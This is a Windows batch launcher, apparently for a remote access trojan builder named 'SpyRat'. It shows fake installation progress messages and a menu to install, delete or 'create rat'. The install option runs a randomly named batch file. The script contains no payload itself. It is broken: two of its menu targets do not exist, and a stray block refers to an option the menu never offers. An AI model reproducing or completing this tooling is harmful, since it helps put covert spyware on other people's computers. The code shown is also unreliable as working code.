echo off
echo SpyRat by Olivier/SympactDev
echo VisualBasic and Python
echo ---------- DOWNLOADING AND INSTALLING REQUIRED FILES ----------
PING localhost -n 10 >NUL
echo ---------- CHECKING PIPS, MODULES, APIS, VS32 ----------
PING localhost -n 3 >NUL
echo ---------- CHECKING IF RUSSIAN GOVERMENT IS ON YOUR PC JKJKJKKKKJKJKJKJKJKJKJKJKJKJKJ ----------
PING localhost -n 3 >NUL
cls
echo --------- WeLcOmE tO sPy-RaT bY oLiViEr/SyMpAcT ----------------
PING localhost -n 2 >NUL
echo STARTING....
PING localhost -n 5 >NUL
echo Made By Sympact/Olivier
PING localhost -n 5 >NUL
cls
echo Copyright Sympact
:choice
set /P c=Do you want to install[I] Delete[D] or create rat[C](FIRST EDIT RAT.PY BEFORE CREATING)
if /I "%c%" EQU "I" goto :installprogram
if /I "%c%" EQU "D" goto :deleteprogram
if /I "%c%" EQU "C" goto :createrat
goto :choice


:installprogram

cls 
echo Copyright Sympact
echo Creating Installer...
START THsiOTsfJP.bat

exit

:somewhere_else

echo "I am here because you typed N"
pause
exit
